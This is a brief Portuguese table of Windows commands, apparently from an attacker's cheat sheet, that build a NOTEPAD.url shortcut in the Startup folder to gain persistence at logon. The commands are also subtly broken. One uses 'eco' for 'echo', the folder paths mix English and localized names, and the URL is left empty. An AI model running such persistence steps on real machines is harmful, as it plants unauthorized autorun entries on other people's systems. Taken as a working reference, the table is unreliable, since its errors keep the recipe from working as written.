Estes comandos são utilizados para criar persistências e criação de outros arquivos no SO.

| COMANDO | DESCRIÇÃO |
|--------------------------------------------|--------------------------------------------------------------------------------------|
| echo [InternetShortcut] > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url" | Criar persistência utilizando arquivo .URL em diretório, sendo construído o arquivo em questão |
| eco URL=" " >> "%appdata%\Microsoft\Windows\Menu Iniciar\Programas\Inicializar\NOTEPAD.url" | Criar persistência utilizando arquivo .URL em diretório, sendo construído o arquivo em questão |
| echo IconFile=C:\WINDOWS\system32\SHELL32.dll >> "%appdata%\Microsoft\Windows\Menu Iniciar\Programas\Inicializar\NOTEPAD.url"  | Criar persistência utilizando arquivo .URL em diretório, sendo construído o arquivo em questão |
| echo IconIndex=20 >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  | Criar persistência utilizando arquivo .URL em diretório, sendo construído o arquivo em questão |
